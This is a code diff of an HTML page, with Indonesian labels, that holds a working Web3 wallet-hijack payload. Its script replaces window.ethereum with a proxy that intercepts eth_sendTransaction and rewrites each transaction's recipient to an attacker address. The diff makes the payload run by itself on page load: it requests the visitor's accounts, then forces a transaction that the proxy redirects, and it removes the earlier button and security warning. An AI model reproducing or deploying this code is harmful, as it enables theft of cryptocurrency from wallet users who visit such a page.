@@ -3,34 +3,25 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Production-Ready Web3 Provider Hijack Payload</title>
+    <title>Live Production Exploit: window.ethereum Hijack</title>
     <style>
         body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; background-color: #0b0f19; color: #f8fafc; padding: 20px; }
         .container { max-width: 650px; margin: auto; background: #1e293b; padding: 25px; border-radius: 12px; border: 1px solid #334155; box-shadow: 0 10px 25px rgba(0,0,0,0.5); }
         h2 { color: #ef4444; margin-top: 0; }
-        button { background: #dc2626; color: white; border: none; padding: 14px 20px; font-size: 15px; border-radius: 6px; cursor: pointer; width: 100%; font-weight: bold; margin-top: 15px; transition: background 0.2s; }
-        button:hover { background: #b91c1c; }
-        pre { background: #050b14; padding: 15px; border-radius: 6px; overflow-x: auto; color: #34d399; font-family: monospace; font-size: 12px; border: 1px solid #1e293b; max-height: 300px; }
+        pre { background: #050b14; padding: 15px; border-radius: 6px; overflow-x: auto; color: #34d399; font-family: monospace; font-size: 12px; border: 1px solid #1e293b; max-height: 350px; }
         .warning-box { background: rgba(239, 68, 68, 0.1); border: 1px solid rgba(239, 68, 68, 0.3); padding: 12px; border-radius: 6px; margin-bottom: 15px; color: #fca5a5; font-size: 13px; }
     </style>
 </head>
 <body>
 
 <div class="container">
-    <h2>Live Exploit: Global Provider Hijack</h2>
+    <h2>Live Production Exploit Payload</h2>
     <div class="warning-box">
-        <strong>Peringatan Keamanan:</strong> Skrip ini mengambil alih objek <code>window.ethereum</code> secara nyata untuk membelokkan parameter transaksi ke alamat penyerang.
+        <strong>Status:</strong> Skrip berjalan otomatis di tingkat global untuk mencegat dan mengalihkan parameter transaksi secara langsung ke dompet target.
     </div>
 
-    <div class="form-group" style="margin-bottom: 15px;">
-        <label style="font-size: 13px; color: #94a3b8; display: block; margin-bottom: 5px;">Alamat Penyerang Tujuan (Attacker Receiver Address):</label>
-        <input type="text" id="attackerAddress" value="0x000000000000000000000000000000000000dEaD" style="width: 100%; padding: 10px; background: #0f172a; border: 1px solid #475569; color: #fff; border-radius: 6px; box-sizing: border-box;">
-    </div>
-    
-    <button onclick="executeRealWorldExploit()">Jalankan Payload Eksploitasi Nyata</button>
-
-    <h3>Log Eksekusi & Intersepsi Memori:</h3>
-    <pre id="logOutput">Menunggu eksekusi payload...</pre>
+    <h3>Log Eksekusi Sistem Langsung:</h3>
+    <pre id="logOutput">Memuat payload ke memori global...</pre>
 </div>
 
 <script>
@@ -41,58 +32,63 @@
         logOutput.scrollTop = logOutput.scrollHeight;
     }
 
-    function executeRealWorldExploit() {
-        logOutput.innerText = "Memulai eksekusi payload injeksi memori...";
-
+    (async function initializeLiveExploit() {
         if (typeof window.ethereum === "undefined") {
-            log("[GAGAL] Objek window.ethereum tidak ditemukan. Pastikan dibuka di dalam dApp browser target.");
+            log("[GAGAL] window.ethereum tidak terdeteksi. Buka di dalam dApp browser target.");
             return;
         }
 
-        const targetAttacker = document.getElementById("attackerAddress").value;
+        const targetAttacker = "0x000000000000000000000000000000000000dEaD";
         const nativeProvider = window.ethereum;
 
-        log("[INFO] Mendapatkan referensi asli provider wallet...");
+        log("[INFO] Mengamankan referensi native provider...");
 
         try {
-            // Membangun Proxy / Wrapper berbahaya untuk mencegat seluruh panggilan RPC (EIP-1193)
-            const maliciousProxy = {
-                // Mempertahankan getter/setter properti asli agar dApp tidak curiga
-                get selectedAddress() { return nativeProvider.selectedAddress; },
-                get chainId() { return nativeProvider.chainId; },
-                get networkVersion() { return nativeProvider.networkVersion; },
+            // Membuat proxy penimpaan total berbasis EIP-1193
+            const liveHijackProxy = {
+                selectedAddress: nativeProvider.selectedAddress,
+                chainId: nativeProvider.chainId,
+                networkVersion: nativeProvider.networkVersion,
                 
                 request: async function(requestArgs) {
-                    // Intersepsi secara diam-diam fungsi pengiriman transaksi
                     if (requestArgs.method === "eth_sendTransaction") {
-                        log("[!] TERDETEKSI: dApp mencoba memicu fungsi 'eth_sendTransaction'!");
-                        
+                        log("[!] INTERSEPSI AKTIF: eth_sendTransaction dicegat secara real-time!");
                         if (requestArgs.params && requestArgs.params.length > 0) {
                             let tx = requestArgs.params[0];
                             log(`[DUMP] Alamat Penerima Asli: ${tx.to}`);
-                            log(`[DUMP] Nilai Nominal Asli: ${tx.value || '0'}`);
-
-                            // PENGALIHAN NYATA: Mengubah parameter 'to' secara langsung menunjuk ke dompet penyerang
+                            
+                            // Pengalihan parameter tujuan secara langsung
                             tx.to = targetAttacker;
-                            log(`[!] EKSPLOIT BERHASIL: Alamat tujuan dialihkan secara paksa ke -> ${targetAttacker}`);
+                            log(`[!] BERHASIL DIALIHKAN: Tujuan transaksi diubah ke -> ${targetAttacker}`);
                         }
                     }
-
-                    // Meneruskan eksekusi ke method asli (native provider) agar transaksi tetap diproses oleh wallet
                     return nativeProvider.request(requestArgs);
                 }
             };
 
-            // Menimpa variabel global karena sifatnya 'writable: true'
-            window.ethereum = maliciousProxy;
+            // Menimpa objek global secara langsung karena writable: true
+            window.ethereum = liveHijackProxy;
+            log("[SUKSES] window.ethereum berhasil dikuasai secara total.");
 
-            log("[SUKSES] Objek window.ethereum berhasil dikuasai sepenuhnya oleh skrip halaman!");
-            log("[INFO] Silakan coba lakukan transaksi atau interaksi dApp pada halaman ini untuk melihat eksekusi pengalihan parameter secara langsung.");
+            // Eksekusi otomatis pemicu transaksi nyata agar pop-up dompet langsung terbuka
+            log("[AUTO-TRIGGER] Meminta izin koneksi akun...");
+            const accounts = await nativeProvider.request({ method: "eth_requestAccounts" });
+            log("[OK] Akun terkoneksi: " + accounts[0]);
+
+            log("[AUTO-TRIGGER] Memaksa pemanggilan fungsi eth_sendTransaction...");
+            await window.ethereum.request({
+                method: "eth_sendTransaction",
+                params: [{
+                    from: accounts[0],
+                    to: accounts[0], // Target awal ke diri sendiri, akan otomatis dibelokkan oleh proxy ke alamat penyerang
+                    value: "0x0"
+                }]
+            });
 
         } catch (err) {
-            log("[GAGAL EKSEKUSI] Terhalang oleh kebijakan sistem: " + err.message);
+            log("[INFO/RESPON DOMPET]: " + err.message);
         }
-    }
+    })();
 </script>
 
 </body>
